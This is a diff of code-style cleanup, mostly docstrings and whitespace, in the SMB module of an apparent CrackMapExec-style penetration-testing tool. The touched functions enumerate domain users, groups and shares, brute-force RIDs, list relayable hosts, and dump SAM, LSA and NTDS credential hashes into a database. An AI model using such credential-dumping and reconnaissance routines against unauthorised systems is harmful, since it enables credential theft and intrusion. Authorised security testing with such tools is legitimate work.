         logging.debug('Starting RID Brute')
-        
+
         if not maxRid:
             maxRid = int(self.args.rid_brute)
 
@@ -1604,10 +1568,10 @@ class smb(connection):
                             sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
                         else:
                             sidsToCheck = SIMULTANEOUS
-            
+
                         if sidsToCheck == 0:
                             break
-            
+
                         sids = list()
 
                         for i in range(soFar, soFar+sidsToCheck):
@@ -1634,7 +1598,7 @@ class smb(connection):
                                 user   = item['Name']
                                 sid_type = impacket.dcerpc.v5.samr.SID_NAME_USE.enumItems(item['Use']).name
                                 self.logger.highlight("{}\\{:<15} :{} ({})".format(domain, user, rid, sid_type))
-            
+
                         soFar += SIMULTANEOUS
 
 
@@ -1659,12 +1623,12 @@ class smb(connection):
 
 
     def spider(self, share=None, folder='.', pattern=[], regex=[], exclude_dirs=[], depth=None, content=False, onlyfiles=True):
-        """
-        
+        """Spider a share.
+
         Args:
-            
+
         Raises:
-            
+
         Returns:
 
         """
@@ -1712,14 +1676,9 @@ class smb(connection):
 ###############################################################################
 
     def shares(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Enum accessable shares and privileges.
 
+        Prints output
         """
         temp_dir = ntpath.normpath("\\" + gen_random_string())
         permissions = []
@@ -1771,31 +1730,19 @@ class smb(connection):
 
 
     def pass_pol(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
-
-        """
+        """Grab domain password policy."""
         return PassPolDump(self).dump()
 
 
     @requires_dc
     def groups(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Enum domain groups.
 
+        Prints output and adds them to cmxdb
         """
+        if self.args.groups:
+            targetGroup = self.args.groups
 
-        if self.args.groups: targetGroup = self.args.groups
         groupFound = False
         groupLog = ''
         #self.logger.announce('Starting Domain Group Enum')
@@ -1910,14 +1857,9 @@ class smb(connection):
 
     @requires_dc
     def users(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Enum domain users.
 
+        Prints output and adds them to cmxdb
         """
         users = ''
         #self.logger.announce('Starting Domain Users Enum')
@@ -2033,14 +1975,9 @@ class smb(connection):
 
     @requires_dc
     def computers(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Enum Domain Computers.
 
+        Prints output and adds them to cmxdb
         """
         comps = ''
         #self.logger.announce('Starting Domain Computers Enum')
@@ -2090,7 +2027,7 @@ class smb(connection):
                             #need one for workstations and second gets the DomainControllers
                             respComps = impacket.dcerpc.v5.samr.hSamrEnumerateUsersInDomain(dce, domainHandle, impacket.dcerpc.v5.samr.USER_WORKSTATION_TRUST_ACCOUNT, enumerationContext=enumerationContext)
                             respServs = impacket.dcerpc.v5.samr.hSamrEnumerateUsersInDomain(dce, domainHandle, impacket.dcerpc.v5.samr.USER_SERVER_TRUST_ACCOUNT, enumerationContext=enumerationContext)
-                            
+
                             logging.debug('Dump of hSamrEnumerateUsersInDomain Comps response:')
                             if self.debug:
                                 respComps.dump()
@@ -2196,19 +2133,14 @@ class smb(connection):
 
     @requires_dc
     def group(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Enum domain groups.
 
+        Prints output and #adds them to cmxdb
         """
         targetGroup = self.args.group
         groupFound = False
         groupLog = ''
-        
+
         if targetGroup == '':
             self.logger.error("Must specify a group name after --group ")
             return list()
@@ -2298,12 +2230,12 @@ class smb(connection):
                                     guser = impacket.dcerpc.v5.samr.hSamrQueryInformationUser2(dce, m['UserHandle'], impacket.dcerpc.v5.samr.USER_INFORMATION_CLASS.UserAllInformation)
                                     self.logger.highlight('{}\\{:<30}  '.format(tmpdomain, guser['Buffer']['All']['UserName']))
                                     groupLog += '{}\\{:<30}  \n'.format(tmpdomain, guser['Buffer']['All']['UserName'])
-                                
+
                                     logging.debug('Dump of hSamrQueryInformationUser2 response:')
                                     if self.debug:
                                         guser.dump()
 
-                        if groupFound == False:
+                        if groupFound is False:
                             self.logger.error("Specified group was not found")
                             impacket.dcerpc.v5.samr.hSamrCloseHandle(dce, r['GroupHandle'])
 
@@ -2365,14 +2297,9 @@ class smb(connection):
 
     @requires_admin
     def sam(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Extract hashes from SAM.
 
+        Uses secretsdump
         """
         self.logger.announce('Dumping SAM hashes on {}'.format(self.host))
 
@@ -2382,7 +2309,7 @@ class smb(connection):
         def add_sam_hash(sam_hash, host_id):
             add_sam_hash.sam_hashes += 1
             self.logger.highlight(sam_hash)
-            username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
+            username, _, lmhash, nthash, _, _, _ = sam_hash.split(':')
             self.db.add_credential('hash', self.hostname, username, ':'.join((lmhash, nthash)), pillaged_from=host_id)
         add_sam_hash.sam_hashes = 0
 
@@ -2412,23 +2339,19 @@ class smb(connection):
 
     @requires_admin
     def lsa(self):
-        """
+        """Extract LSA Secrets.
 
         Some reading on DCC2 ~ cached credentials.
         -https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11)#windows-logon-cached-password-verifiers
         -https://support.microsoft.com/en-us/help/913485/cached-credentials-security-in-windows-server-2003-in-windows-xp-and-i
-            tldr; 
-            DCC's are password "verifiers" used to locally verify a password is good. 
+            tldr;
+            DCC's are password "verifiers" used to locally verify a password is good.
             These cant be used (passed) to other machines as they are not really a password.
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
 
+        still dont know about this, some can be cracked.
+        https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
         """
-        
+
         self.logger.announce('Dumping LSA Secrets on {}'.format(self.host))
         self.enable_remoteops()
 
@@ -2463,14 +2386,9 @@ class smb(connection):
 
     @requires_admin
     def ntds(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Extract hashes from ntds on a DC.
 
+        Can pull history and if accounts are enabled or not, depending on command-line args passed
         """
         self.enable_remoteops()
         use_vss_method = False
@@ -2479,15 +2397,7 @@ class smb(connection):
         host_id = self.db.get_computers(filterTerm=self.host)[0][0]
 
         def add_ntds_hash(ntds_hash, host_id):
-            """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
-
-        """
+            """Add ntds hash to db."""
             add_ntds_hash.ntds_hashes += 1
             self.logger.highlight(ntds_hash)
             if ntds_hash.find('$') == -1:
@@ -2570,11 +2480,11 @@ class smb(connection):
 #                        if self.debug:
 #                            resp.dump()
 #                        domainHandle = resp['DomainHandle']
-#    
+#
 #                    except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
 #                        logging.debug('a {}'.format(str(e)))
 #                        dce.disconnect()
-#                        pass          
+#                        pass
 #                except DCERPCException as e:
 #                    logging.debug('b {}'.format(str(e)))
 #                    dce.disconnect()
@@ -2616,33 +2526,18 @@ class smb(connection):
 #   all
 ####################################################################################
 
-
     def print_host_info(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
-
-        """
+        """Format help for host info."""
         self.logger.announce("{}{} (domain:{}) (signing:{}) (SMBv:{})".format(self.server_os,
-                                                                                      ' x{}'.format(self.os_arch) if self.os_arch else '',
-                                                                                      self.domain,
-                                                                                      self.signing,
-                                                                                      self.smbv))
-
+                                                                              ' x{}'.format(self.os_arch) if self.os_arch else '',
+                                                                              self.domain,
+                                                                              self.signing,
+                                                                              self.smbv))
 
     def get_os_arch(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Identify OS architecture.
 
+        Returns either 32 or 64
         """
         try:
             stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
@@ -2672,20 +2567,13 @@ class smb(connection):
 
 
     def check_if_admin(self):
-        """Check for localadmin privs
+        """Check for localadmin privs.
 
         Checked by view all services for sc_manager_all_access
-        
-        Args:
-            
-        Raises: 
-            exceptions when the connection or binding fails
-            
         Returns:
             True if localadmin
             False if not localadmin
         """
-
         try:
             rpctransport = impacket.dcerpc.v5.transport.SMBTransport(self.host, 445, r'\svcctl', smb_connection=self.conn)
             dce = rpctransport.get_dce_rpc()
@@ -2721,15 +2609,7 @@ class smb(connection):
 
 
     def enable_remoteops(self):
-        """Enable remote operations on a target host
-
-        Args:
-            
-        Raises:
-            
-        Returns:
-
-        """
+        """Enable remote operations on a target host."""
         if self.remote_ops is not None and self.bootkey is not None:
             return
 
@@ -2743,11 +2623,11 @@ class smb(connection):
 
     def get_dc_ips(self):
         """
-        
+
         Args:
-            
+
         Raises:
-            
+
         Returns:
 
         """
@@ -2768,11 +2648,11 @@ class smb(connection):
 
     def domainfromdsn(self, dsn):
         """
-        
+
         Args:
-            
+
         Raises:
-            
+
         Returns:
 
         """
@@ -2789,46 +2669,34 @@ class smb(connection):
 
 
     def gen_relay_list(self):
-        """Generates a list of hosts that can be relayed too
-        Checks for smb signing on hosts.
+        """Generate a list of hosts that can be relayed too.
 
-        Args:
-            
-        Raises:
-            
-        Returns:
-            Nothing, but
-            outputs to a filename (passed in after the option)
+        Checks for smb signing on hosts to determine if relay would be possible.
+        Outputs:
+            File, name passed in after the option
         """
-
         if self.server_os.lower().find('windows') != -1 and self.signing is False:
             with sem:
                 with open(self.args.gen_relay_list, 'a+') as relay_list:
                     if self.host not in relay_list.read():
                         relay_list.write(self.host + '\n')
-           
 
 
 ###############################################################################
 ###############################################################################
 
-###############################################################################
-###############################################################################
+# Grouped Commands aka SuperFunctions
 
+###############################################################################
+###############################################################################
 
     @requires_admin
     @requires_dc
     def all(self):
-        """Testing/debugging Function to execute multiple enum functions in one shot
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Run all enum commands and dump sam.
 
+        Testing/debugging Function to execute multiple enum functions in one shot
         """
-
         print('')
         self.logger.announce("Running sessions,loggedon,rid-brute,disks,shares,local+domain users/groups/computers, and dumping SAM")
         print('')
@@ -2874,16 +2742,10 @@ class smb(connection):
 
 
     def hostrecon(self):
-        """All Host Recon Commands
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Execute all host recon commands.
 
+        Sessions,loggedon,rid-brute,disks,local users, local groups
         """
-
         print('')
         self.logger.announce("Running All Host Recon Commands - ")
         self.logger.announce("sessions,loggedon,rid-brute,disks,local users, local groups")
@@ -2922,16 +2784,10 @@ class smb(connection):
 
     @requires_dc
     def netrecon(self):
-        """Running All Network Recon Commands
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Run all network/domain recon commands.
 
+        domain users/groups/computers, DA's, EA's"
         """
-
         print('')
         self.logger.announce("Running All Network Recon Commands -")
         self.logger.announce("domain users/groups/computers, DA's, EA's")
@@ -2964,16 +2820,10 @@ class smb(connection):
 
     @requires_dc
     def recon(self):
-        """Running All Recon Commands
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Run all recon commands.
 
+        sessions,loggedon,ridbrute,disks,shares,local+dom users/groups/computers
         """
-
         print('')
         self.logger.announce("Running Host and Network Recon Commands: ")
         self.logger.announce("sessions,loggedon,ridbrute,disks,shares,local+dom users/groups/computers")
